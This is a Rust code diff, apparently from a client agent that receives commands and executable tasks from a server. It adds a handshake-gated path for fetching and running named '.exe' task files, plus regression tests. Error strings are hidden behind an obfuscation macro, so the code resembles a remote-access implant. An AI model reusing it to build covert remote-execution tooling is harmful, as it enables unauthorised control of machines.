@@ -32,6 +32,35 @@ pub async fn handle_kik(
 ) -> anyhow::Result<()> {
     let frame = KikFrame::from_buf(msg).ok_or_else(|| anyhow::Error::msg(hidden!("帧格式错误")))?;
     match frame {
+        KikFrame::Task(common::task::TaskFrame::PrepareNamed {
+            id,
+            size,
+            hash,
+            spec,
+            file_name,
+        }) => {
+            if channel
+                .lock()
+                .await
+                .attribute(&common::task::TASK_NAMED_CACHE_CAPABLE)
+                != Some(&true)
+            {
+                return Err(anyhow::Error::msg(hidden!("任务文件名协议尚未确认")));
+            }
+            crate::task_runner::dispatch(context, channel, id, size, hash, spec, file_name).await?;
+        }
+        KikFrame::Task(common::task::TaskFrame::AbandonTransfer(id)) => {
+            crate::task_runner::abandon(&channel, &id).await;
+        }
+        // 只确认最终文件名协议。旧服务端的 ACK/Prepare 仍可解码，但不会解锁握手或执行。
+        KikFrame::Task(common::task::TaskFrame::HelloNamedAck) => {
+            let mut channel = channel.lock().await;
+            if let Some(sender) = channel.attribute(&crate::kik_conn::TASK_HELLO_ACK).cloned() {
+                if sender.try_send(()).is_ok() {
+                    channel.insert_attribute(&common::task::TASK_NAMED_CACHE_CAPABLE, true);
+                }
+            }
+        }
         // 命令只进入工作队列，不在读循环执行；这样慢命令不会阻塞 Ping/Pong。
         KikFrame::Cmd(req_cmd) => {
             let command = req_cmd.split();
@@ -159,4 +188,135 @@ pub async fn handle_init_message(
         }
     }
     Ok(())
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use common::task::{TaskCacheKey, TaskFrame, TaskSpec, TASK_NAMED_CACHE_CAPABLE};
+
+    fn channel() -> Arc<Mutex<Channel>> {
+        Arc::new(Mutex::new(Channel::new(
+            Box::pin(tokio::io::sink()),
+            Some("named-handshake-regression-channel".into()),
+            common::channel::ChannelType::Kik,
+            Err(std::io::Error::other(
+                "named-handshake-test-no-local-address",
+            )),
+            Err(std::io::Error::other(
+                "named-handshake-test-no-peer-address",
+            )),
+        )))
+    }
+
+    #[tokio::test]
+    async fn only_named_ack_confirms_the_current_connection() {
+        let context = Context::new();
+        let channel = channel();
+        let (sender, mut receiver) = tokio::sync::mpsc::channel(1);
+        channel
+            .lock()
+            .await
+            .insert_attribute(&crate::kik_conn::TASK_HELLO_ACK, sender);
+        for old_ack in [TaskFrame::HelloAck, TaskFrame::HelloCachedAck] {
+            assert!(
+                handle_kik(&context, channel.clone(), KikFrame::Task(old_ack).to_buf())
+                    .await
+                    .is_err()
+            );
+            assert!(receiver.try_recv().is_err());
+            assert!(channel
+                .lock()
+                .await
+                .attribute(&TASK_NAMED_CACHE_CAPABLE)
+                .is_none());
+        }
+        handle_kik(
+            &context,
+            channel.clone(),
+            KikFrame::Task(TaskFrame::HelloNamedAck).to_buf(),
+        )
+        .await
+        .unwrap();
+        assert_eq!(receiver.try_recv(), Ok(()));
+        assert_eq!(
+            channel.lock().await.attribute(&TASK_NAMED_CACHE_CAPABLE),
+            Some(&true)
+        );
+        // 另一个连接没有继承确认标志，避免重连后沿用旧代次的协商结果。
+        assert!(self::channel()
+            .lock()
+            .await
+            .attribute(&TASK_NAMED_CACHE_CAPABLE)
+            .is_none());
+    }
+
+    #[tokio::test]
+    async fn old_prepare_frames_never_execute_and_named_prepare_requires_ack() {
+        let context = Context::new();
+        let channel = channel();
+        let spec = TaskSpec {
+            asynchronous: false,
+            output: false,
+            timeout_seconds: 5,
+            args: vec![],
+            default_content: "legacy-task-prepare-rejection-regression".into(),
+        };
+        let frames = [
+            TaskFrame::Prepare {
+                id: "legacy-prepare-regression".into(),
+                size: 4,
+                hash: [0; 32],
+                spec: spec.clone(),
+            },
+            TaskFrame::PrepareCached {
+                id: "opaque-prepare-regression".into(),
+                size: 4,
+                hash: [0; 32],
+                spec: spec.clone(),
+                cache: TaskCacheKey {
+                    id: [0; 32],
+                    extension: "exe".into(),
+                },
+            },
+            TaskFrame::PrepareNamed {
+                id: "unconfirmed-named-prepare-regression".into(),
+                size: 4,
+                hash: [0; 32],
+                spec,
+                file_name: "must-not-open-before-handshake.exe".into(),
+            },
+        ];
+        for frame in frames {
+            assert!(
+                handle_kik(&context, channel.clone(), KikFrame::Task(frame).to_buf())
+                    .await
+                    .is_err()
+            );
+        }
+        // 旧格式即使在新协议确认后也必须拒绝，不能同时维护两种落盘执行语义。
+        channel
+            .lock()
+            .await
+            .insert_attribute(&TASK_NAMED_CACHE_CAPABLE, true);
+        let old = TaskFrame::PrepareCached {
+            id: "confirmed-still-rejects-opaque-prepare".into(),
+            size: 4,
+            hash: [0; 32],
+            spec: TaskSpec {
+                asynchronous: false,
+                output: false,
+                timeout_seconds: 5,
+                args: vec![],
+                default_content: String::new(),
+            },
+            cache: TaskCacheKey {
+                id: [0; 32],
+                extension: "exe".into(),
+            },
+        };
+        assert!(handle_kik(&context, channel, KikFrame::Task(old).to_buf())
+            .await
+            .is_err());
+    }
 }
